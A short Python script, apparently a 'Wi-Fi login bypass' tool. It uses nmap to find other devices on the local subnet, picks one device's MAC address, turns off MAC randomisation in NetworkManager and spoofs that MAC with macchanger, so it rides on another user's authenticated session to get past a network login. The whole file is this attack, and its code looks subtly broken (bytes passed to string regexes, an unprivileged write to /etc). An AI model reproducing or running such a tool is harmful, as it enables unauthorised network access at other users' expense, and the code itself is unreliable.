import subprocess, re, time

def main():
    i = input("Enter wifi interface: ")
    p = subprocess.run(["ifconfig"], stdout=subprocess.PIPE)
    data = p.stdout
    try:
        m = re.findall(i + ':(.*?)inet (.*?) netmask', data, re.DOTALL)[0][1].split()[0]
    except Exception as e:
        print(e)

    p = subprocess.run(["nmap", "-sP", m + "/24"], stdout=subprocess.PIPE)
    data = p.stdout
    try:
        m = re.findall('MAC Address: (.*?) ', data, re.DOTALL)
    except Exception as e:
        print(e)

    mac = m[int(len(m) / 2) + 1]

    p = subprocess.run(["sudo", "cat", "/etc/NetworkManager/NetworkManager.conf"], stdout=subprocess.PIPE)
    data = p.stdout

    try:
        m = re.findall('wifi.scan-rand-mac-address=no', data, re.DOTALL)
    except Exception as e:
        print(e)

    if not len(m):
        print(1)
        with open('/etc/NetworkManager/NetworkManager.conf', 'a') as f:
            f.write("\n\n[device]\nwifi.scan-rand-mac-address=no")
        subprocess.run(["sudo", "service", "network-manager", "restart"])

    p = subprocess.run(["sudo", "ifconfig", i, "down"])
    print(1)
    p = subprocess.run(["sudo", "macchanger", "--mac", mac, i])
    p = subprocess.run(["sudo", "ifconfig", i, "up"])
    p = subprocess.run(["sudo", "service", "network-manager", "restart"])
    print("Wifi Login Bypassed!")

main()
